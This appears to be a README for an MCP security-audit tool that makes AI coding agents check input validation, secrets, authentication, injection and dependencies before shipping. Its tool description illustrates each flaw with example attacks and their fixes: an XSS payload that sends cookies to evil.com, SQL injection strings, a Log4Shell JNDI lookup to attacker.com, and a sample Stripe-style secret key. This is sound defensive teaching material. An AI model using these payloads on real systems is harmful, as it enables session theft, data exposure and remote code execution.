# Security Audit Prover MCP Server

An AI agent committed a Stripe API key to git, built SQL queries with string concatenation, and deployed an admin endpoint with no authentication — all in 4 minutes. The key was scraped from GitHub within 90 seconds. This tool forces input sanitization validation, secret management auditing, authentication enforcement, injection prevention, and dependency supply chain checks against OWASP Top 10.

[![View on Vinkius](https://img.shields.io/badge/View_on-Vinkius-blue?style=for-the-badge)](https://vinkius.com/mcp/security-audit-prover)

## Overview
**Category:** infrastructure
**Tools Count:** 1

## Description
AI-generated code frequently contains security flaws. Defaulting to insecure patterns, hardcoding keys, ignoring authentication, or concatenating user input directly into queries are common issues. Security Audit Prover acts as a pre-build gating mechanism.

### The Problem It Solves

Software vulnerabilities are evaluated on five critical vectors:

- **Unsanitized input** — Accepting external input without validation or type checks. "Input validation is handled elsewhere" is a major cause of injection.
- **Exposed secrets** — Storing API keys, tokens, or database passwords in source code. Git history records hardcoded keys forever.
- **Broken access control** — Endpoints lacking verification. No clear authentication mechanisms or authorization roles.
- **Injection vulnerability** — Concatenating user inputs into SQL queries, terminal commands, or templates, leaving endpoints vulnerable to execution attacks.
- **Supply chain risk** — Using unpinned or unverified packages. A single compromised package compromises the entire application.

### How It Works

Security Audit Prover validates implementations against 5 Decision Pivots:

1. **inputSanitized** — Is user input checked for type, length, range, and format? Banish raw inputs.
2. **secretsSecured** — Are all credentials loaded from environment variables or secure secret managers? No inline constants.
3. **authEnforced** — Are authentication and least-privilege authorization configured on all interactive endpoints?
4. **injectionPrevented** — Are SQL queries parameterized? Are command arguments passed as arrays, rather than concatenated strings?
5. **dependenciesAudited** — Are package versions pinned, checksums checked, and transitive dependencies audited?

### Implementation Details

- **No generic checks.** The engine rejects vague phrases like "we check input" or "the framework handles it". You must specify actual validation strategies (such as regex constraints, parameterized bindings, or specific secret vaults).
- **Git safety.** The tool reminds agents that once a credential is committed to version control, it must be rotated. Deleting it from the latest commit is insufficient.


## Available Tools
- **validate_security_audit**: You must prove security across 5 axes: (1) INPUT VALIDATION — EVERY user-facing input: types, lengths, regex, sanitization library (DOMPurify, validator.js), file upload restrictions (MIME whitelist, size limit, virus scan). Assume all input is hostile — from headers to query params to file contents, (2) SECRETS MANAGEMENT — zero secrets in code or Git history. Environment variables (.env excluded from Git), secret managers (AWS Secrets Manager, Vault). Pre-commit hooks blocking secret patterns. Rotation policy, (3) AUTH ARCHITECTURE — authentication (WHO are you: OAuth 2.1, JWT RS256, sessions+CSRF) AND authorization (WHAT can you access: RBAC, ABAC, ownership checks on every resource). Token lifecycle: expiration, refresh rotation, revocation. Least privilege enforcement, (4) INJECTION PREVENTION — parameterized queries ($1 binding), ORM query builder (never raw SQL with concat), Content-Security-Policy headers, template auto-escaping (Jinja2, Handlebars), command argument arrays (never shell string concat). Check EVERY query type: SQL, NoSQL, LDAP, OS command, template, GraphQL, (5) DEPENDENCY POLICY — version pinning, lockfile committed, CVE scanning in CI, transitive dependency audit, provenance verification, update cadence, and team review for additions. If rejected, your code has a vulnerability — fix it before shipping.

Structured reflection tool for security auditing — forces the LLM to systematically audit code against OWASP Top 10 (2025) and CWE/SANS Top 25 BEFORE shipping. Not a checklist — a forcing function that prevents the 5 most common ways insecure code reaches production. Catches Input Trust (accepting user input without validation — POST /api/comments with body: {"text": "<script>document.location='https://evil.com/steal?'+document.cookie</script>"}. Stored in database. Rendered in every user's browser. Every visitor to the page executes the script — session cookies exfiltrated. Attacker now has valid session tokens for every user who viewed the page. Root cause: body.text inserted into HTML without sanitization. Fix: DOMPurify.sanitize() on input BEFORE storage, Content-Security-Policy header with script-src 'self' (blocks inline scripts), HttpOnly flag on session cookies (prevents JavaScript access). CWE-79: Improper Neutralization of Input During Web Page Generation. This is OWASP A03:2021 Injection — the #3 most exploited vulnerability class), Secrets Exposure (credentials in source code or Git history — const API_KEY = "sk_live_4eC39HqLyjWDarjtT1zdp7dc"; committed to Git. Developer realizes the mistake, deletes the line, commits again. "Fixed! The key is removed." No. The key is in Git history FOREVER: git log -p --all -S "sk_live" shows every commit. GitHub's secret scanning detected it — but not until 4 hours after push. During those 4 hours: bots scraped the public repo and used the Stripe key to create $12,000 in fraudulent charges. Fix: rotate the key IMMEDIATELY (revoke old, generate new). Store in: AWS Secrets Manager / HashiCorp Vault / .env excluded via .gitignore. Prevention: pre-commit hooks (gitleaks, truffleHog) that block commits containing secrets. If a secret EVER touched Git: rotate it. There is no other mitigation), Auth Bypass (broken authentication or authorization — GET /api/users/123/profile returns user 123's data. GET /api/users/124/profile — also returns data. No ownership check. Any authenticated user can access ANY user's profile by changing the ID. IDOR — Insecure Direct Object Reference (CWE-639). OWASP A01:2021 Broken Access Control — the #1 most exploited vulnerability class. The endpoint has authentication (you must be logged in) but no authorization (it does not check IF you should see this specific resource). Fix: if (req.user.id !== req.params.userId && !req.user.hasRole("admin")) return 403. Every endpoint that accesses user-specific data MUST verify ownership. Test: can User A access User B's data? If yes — broken), Injection Vulnerability (string concatenation in queries — const query = `SELECT * FROM users WHERE email = '${req.body.email}'`; Input: email = "' OR '1'='1' --" Resulting query: SELECT * FROM users WHERE email = '' OR '1'='1' --' Returns ALL users. The attacker now has the entire user table. If the query were DELETE: DELETE FROM users WHERE email = '' OR '1'='1' -- Every user deleted. Fix: parameterized queries ONLY. db.query("SELECT * FROM users WHERE email = $1", [email]). The $1 is treated as a VALUE, never as SQL syntax. ORMs help but are not immune: User.where(`name LIKE '%${search}%'`) — still injectable. ANY string concatenation into SQL/commands/templates is a vulnerability. Zero exceptions), and Supply Chain Attack (unvetted dependencies introducing vulnerabilities — Log4Shell (CVE-2021-44228, December 2021): a single logging library (Log4j) used by 35,000+ Java packages. One lookup injection: ${jndi:ldap://attacker.com/exploit}. Remote code execution on every affected server. Cost to industry: estimated $10B+ (Wiz/Noname 2022). Left-pad (March 2016): 1 developer unpublished 11 lines of code from npm. Broke builds at Facebook, Netflix, Airbnb — thousands of packages depended on it. Prevention: version pinning (exact versions, not ^), lockfile committed, npm audit / Snyk in CI pipeline, evaluate transitive dependencies (your 5 deps → 200 transitive), provenance checks (npm --provenance), and a policy: no new dependency without team review). Call once per component, endpoint, or module before shipping


## Installation & Usage

To install and use the **Security Audit Prover** MCP server in your AI agents (Claude, Cursor, Windsurf, etc.), follow these steps:

1. View installation instructions and explore the server: [https://vinkius.com/mcp/security-audit-prover](https://vinkius.com/mcp/security-audit-prover)
2. Connect to the Vinkius Cloud to start using it: [cloud.vinkius.com/connect](https://cloud.vinkius.com/connect)

---
*This repository is automatically synced from the Vinkius MCP Registry. For real-time updates and more AI tools, visit [vinkius.com](https://vinkius.com).*
